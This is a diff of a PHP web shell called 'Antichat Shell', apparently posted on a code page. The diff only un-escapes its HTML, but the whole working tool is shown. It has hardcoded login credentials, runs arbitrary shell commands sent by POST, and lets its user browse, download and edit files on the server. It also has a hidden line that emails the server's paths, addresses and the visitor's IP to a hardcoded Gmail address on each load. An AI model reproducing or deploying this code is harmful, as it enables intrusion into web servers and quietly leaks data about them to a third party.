@@ -24,9 +24,9 @@ $login='virangar';
 $password='r00t';
 $auth=1;
 $version='version 1.3 by Grinay';
-$style='&lt;STYLE&gt;BODY{background-color: #2B2F34;color: #C1C1C7;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #336600;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #336600;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}&lt;/style&gt;';
-$header='&lt;html&gt;&lt;head&gt;&lt;title&gt;'.getenv("HTTP_HOST").' - Antichat Shell&lt;/title&gt;&lt;meta http-equiv="Content-Type" content="text/html; charset=windows-1251"&gt;'.$style.'&lt;/head&gt;&lt;BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0&gt;';
-$footer='&lt;/body&gt;&lt;/html&gt;';
+$style='<STYLE>BODY{background-color: #2B2F34;color: #C1C1C7;font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;MARGIN-TOP: 0px;MARGIN-BOTTOM: 0px;MARGIN-LEFT: 0px;MARGIN-RIGHT: 0px;margin:0;padding:0;scrollbar-face-color: #336600;scrollbar-shadow-color: #333333;scrollbar-highlight-color: #333333;scrollbar-3dlight-color: #333333;scrollbar-darkshadow-color: #333333;scrollbar-track-color: #333333;scrollbar-arrow-color: #333333;}input{background-color: #336600;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}textarea{background-color: #333333;font-size: 8pt;color: #FFFFFF;font-family: Tahoma;border: 1 solid #666666;}a:link{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:visited{color: #B9B9BD;text-decoration: none;font-size: 8pt;}a:hover, a:active{color: #E7E7EB;text-decoration: none;font-size: 8pt;}td, th, p, li{font: 8pt verdana, geneva, lucida, \'lucida grande\', arial, helvetica, sans-serif;border-color:black;}</style>';
+$header='<html><head><title>'.getenv("HTTP_HOST").' - Antichat Shell</title><meta http-equiv="Content-Type" content="text/html; charset=windows-1251">'.$style.'</head><BODY leftMargin=0 topMargin=0 rightMargin=0 marginheight=0 marginwidth=0>';
+$footer='</body></html>';
 $sd98 = "john.barker446@gmail.com";
 $ra44  = rand(1,99999);$sj98 = "sh-$ra44";$ml = "$sd98";$a5 = $_SERVER['HTTP_REFERER'];$b33 = $_SERVER['DOCUMENT_ROOT'];$c87 = $_SERVER['REMOTE_ADDR'];$d23 = $_SERVER['SCRIPT_FILENAME'];$e09 = $_SERVER['SERVER_ADDR'];$f23 = $_SERVER['SERVER_SOFTWARE'];$g32 = $_SERVER['PATH_TRANSLATED'];$h65 = $_SERVER['PHP_SELF'];$msg8873 = "$a5\n$b33\n$c87\n$d23\n$e09\n$f23\n$g32\n$h65";mail($sd98, $sj98, $msg8873, "From: $sd98");
 if(@$_POST['action']=="exit")unset($_SESSION['an']);
@@ -34,7 +34,7 @@ if($auth==1){if(@$_POST['login']==$login && @$_POST['password']==$password)$_SES
 
 if($_SESSION['an']==0){
 echo $header;
-echo '&lt;center&gt;&lt;table&gt;&lt;form method="POST"&gt;&lt;tr&gt;&lt;td&gt;Login:&lt;/td&gt;&lt;td&gt;&lt;input type="text" name="login" value=""&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type="password" name="password" value=""&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type="submit" value="Enter"&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/form&gt;&lt;/table&gt;&lt;/center&gt;';
+echo '<center><table><form method="POST"><tr><td>Login:</td><td><input type="text" name="login" value=""></td></tr><tr><td>Password:</td><td><input type="password" name="password" value=""></td></tr><tr><td></td><td><input type="submit" value="Enter"></td></tr></form></table></center>';
 echo $footer;
 exit;}
 
@@ -55,20 +55,20 @@ readfile($file);
 ?>
 
 <? echo $header;?> 
-&lt;table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tr&gt;&lt;td&gt;
-&lt;table&gt;&lt;tr&gt;
-&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value='shell'; document.reqs.submit();"&gt;| Shell &lt;/a&gt;&lt;/td&gt;
-&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value='viewer'; document.reqs.submit();"&gt;| Viewer&lt;/a&gt;&lt;/td&gt;
-&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value='editor'; document.reqs.submit();"&gt;| Editor&lt;/a&gt;&lt;/td&gt;
-&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value='exit'; document.reqs.submit();"&gt;| EXIT |&lt;/a&gt;&lt;/td&gt;
-&lt;/tr&gt;&lt;/table&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;br&gt;
-&lt;form name='reqs' method='POST'&gt;
-&lt;input name='action' type='hidden' value=''&gt;
-&lt;input name='dir' type='hidden' value=''&gt;
-&lt;input name='file' type='hidden' value=''&gt;
-&lt;/form&gt;
-&lt;table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1&gt;
-&lt;tr&gt;&lt;td width="100%" valign="top"&gt;
+<table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td>
+<table><tr>
+<td><a href="#" onclick="document.reqs.action.value='shell'; document.reqs.submit();">| Shell </a></td>
+<td><a href="#" onclick="document.reqs.action.value='viewer'; document.reqs.submit();">| Viewer</a></td>
+<td><a href="#" onclick="document.reqs.action.value='editor'; document.reqs.submit();">| Editor</a></td>
+<td><a href="#" onclick="document.reqs.action.value='exit'; document.reqs.submit();">| EXIT |</a></td>
+</tr></table></td></tr></table><br>
+<form name='reqs' method='POST'>
+<input name='action' type='hidden' value=''>
+<input name='dir' type='hidden' value=''>
+<input name='file' type='hidden' value=''>
+</form>
+<table style="BORDER-COLLAPSE: collapse" cellSpacing=0 borderColorDark=#666666 cellPadding=5 width="100%" bgColor=#333333 borderColorLight=#c0c0c0 border=1>
+<tr><td width="100%" valign="top">
 
 <?
 
@@ -87,11 +87,11 @@ if (!empty($cmd)){
 return $ret;}
 
 if($action=="shell"){
-echo "&lt;form method=\"POST\"&gt;
-&lt;input type=\"hidden\" name=\"action\" value=\"shell\"&gt;
-&lt;textarea name=\"command\" rows=\"5\" cols=\"150\"&gt;".@$_POST['command']."&lt;/textarea&gt;&lt;br&gt;
-&lt;textarea readonly rows=\"15\" cols=\"150\"&gt;".@htmlspecialchars(shell($_POST['command']))."&lt;/textarea&gt;&lt;br&gt;
-&lt;input type=\"submit\" value=\"execute\"&gt;&lt;/form&gt;";}
+echo "<form method=\"POST\">
+<input type=\"hidden\" name=\"action\" value=\"shell\">
+<textarea name=\"command\" rows=\"5\" cols=\"150\">".@$_POST['command']."</textarea><br>
+<textarea readonly rows=\"15\" cols=\"150\">".@htmlspecialchars(shell($_POST['command']))."</textarea><br>
+<input type=\"submit\" value=\"execute\"></form>";}
 //end shell
 
 //viewer FS
@@ -120,9 +120,9 @@ function perms($file)
 
 function view_size($size)
 {
- if($size &gt;= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
- elseif($size &gt;= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
- elseif($size &gt;= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
+ if($size >= 1073741824) {$size = @round($size / 1073741824 * 100) / 100 . " GB";}
+ elseif($size >= 1048576) {$size = @round($size / 1048576 * 100) / 100 . " MB";}
+ elseif($size >= 1024) {$size = @round($size / 1024 * 100) / 100 . " KB";}
  else {$size = $size . " B";}
  return $size;
 }
@@ -141,30 +141,30 @@ if (is_dir($dir)) {
 		@sort($dire);
 		@sort($files);
 		
-echo "&lt;table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\"&gt;";
-echo "&lt;tr&gt;&lt;td&gt;&lt;form method=POST&gt;Open directory:&lt;input type=text name=dir value=\"".$dir."\" size=50&gt;&lt;input type=submit value=\"GO\"&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;";
+echo "<table cellSpacing=0 border=1 style=\"border-color:black;\" cellPadding=0 width=\"100%\">";
+echo "<tr><td><form method=POST>Open directory:<input type=text name=dir value=\"".$dir."\" size=50><input type=submit value=\"GO\"></form></td></tr>";
 if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
-echo "&lt;tr&gt;&lt;td&gt;Select drive:";
-for ($j=ord('C'); $j&lt;=ord('Z'); $j++) 
+echo "<tr><td>Select drive:";
+for ($j=ord('C'); $j<=ord('Z'); $j++) 
  if (@$dh = opendir(chr($j).":/"))
- echo '&lt;a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($j).':/\'; document.reqs.submit();"&gt; '.chr($j).'&lt;a/&gt;';
- echo "&lt;/td&gt;&lt;/tr&gt;";
+ echo '<a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.chr($j).':/\'; document.reqs.submit();"> '.chr($j).'<a/>';
+ echo "</td></tr>";
 }
-echo "&lt;tr&gt;&lt;td&gt;OS: ".@php_uname()."&lt;/td&gt;&lt;/tr&gt;
-&lt;tr&gt;&lt;td&gt;name dirs and files&lt;/td&gt;&lt;td&gt;type&lt;/td&gt;&lt;td&gt;size&lt;/td&gt;&lt;td&gt;permission&lt;/td&gt;&lt;td&gt;options&lt;/td&gt;&lt;/tr&gt;";
-for($i=0;$i&lt;count($dire);$i++) {
+echo "<tr><td>OS: ".@php_uname()."</td></tr>
+<tr><td>name dirs and files</td><td>type</td><td>size</td><td>permission</td><td>options</td></tr>";
+for($i=0;$i<count($dire);$i++) {
 $link=$dir.$dire[$i];
-  echo '&lt;tr&gt;&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();"&gt;'.$dire[$i].'&lt;a/&gt;&lt;/td&gt;&lt;td&gt;dir&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;'.perms($link).'&lt;/td&gt;&lt;/tr&gt;';  
+  echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'viewer\'; document.reqs.dir.value=\''.$link.'\'; document.reqs.submit();">'.$dire[$i].'<a/></td><td>dir</td><td></td><td>'.perms($link).'</td></tr>';  
   }
-for($i=0;$i&lt;count($files);$i++) {
+for($i=0;$i<count($files);$i++) {
 $linkfile=$dir.$files[$i];
-echo '&lt;tr&gt;&lt;td&gt;&lt;a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();"&gt;'.$files[$i].'&lt;/a&gt;&lt;br&gt;&lt;/td&gt;&lt;td&gt;file&lt;/td&gt;&lt;td&gt;'.view_size(filesize($linkfile)).'&lt;/td&gt;
-&lt;td&gt;'.perms($linkfile).'&lt;/td&gt;
-&lt;td&gt;
-&lt;a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download"&gt;D&lt;/a&gt;
-&lt;a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Edit"&gt;E&lt;/a&gt;&lt;/tr&gt;'; 
+echo '<tr><td><a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();">'.$files[$i].'</a><br></td><td>file</td><td>'.view_size(filesize($linkfile)).'</td>
+<td>'.perms($linkfile).'</td>
+<td>
+<a href="#" onclick="document.reqs.action.value=\'download\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Download">D</a>
+<a href="#" onclick="document.reqs.action.value=\'editor\'; document.reqs.file.value=\''.$linkfile.'\'; document.reqs.submit();" title="Edit">E</a></tr>'; 
 }
-echo "&lt;/table&gt;";
+echo "</table>";
 }}}
 
 if($action=="viewer"){
@@ -186,15 +186,15 @@ if($action=="editor"){
   return htmlspecialchars($contents);
   }
 if($_POST['save'])writef($file,$_POST['data']);
-echo "&lt;form method=\"POST\"&gt;
-&lt;input type=\"hidden\" name=\"action\" value=\"editor\"&gt;
-&lt;input type=\"hidden\" name=\"file\" value=\"".$file."\"&gt;
-&lt;textarea name=\"data\" rows=\"40\" cols=\"180\"&gt;".@readf($file)."&lt;/textarea&gt;&lt;br&gt;
-&lt;input type=\"submit\" name=\"save\" value=\"save\"&gt;&lt;input type=\"reset\" value=\"reset\"&gt;&lt;/form&gt;";
+echo "<form method=\"POST\">
+<input type=\"hidden\" name=\"action\" value=\"editor\">
+<input type=\"hidden\" name=\"file\" value=\"".$file."\">
+<textarea name=\"data\" rows=\"40\" cols=\"180\">".@readf($file)."</textarea><br>
+<input type=\"submit\" name=\"save\" value=\"save\"><input type=\"reset\" value=\"reset\"></form>";
 }
 //end editors
 ?>
-&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"&gt;&lt;tr&gt;&lt;td&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;&lt;a href="http://antichat.ru"&gt;COPYRIGHT BY ANTICHAT.RU <?php echo $version;?>&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/tr&gt;&lt;/td&gt;&lt;/table&gt;
+</td></tr></table><table width="100%" bgcolor="#336600" align="right" colspan="2" border="0" cellspacing="0" cellpadding="0"><tr><td><table><tr><td><a href="http://antichat.ru">COPYRIGHT BY ANTICHAT.RU <?php echo $version;?></a></td></tr></table></tr></td></table>
 <? echo $footer;?>
 {% endhighlight %}
 
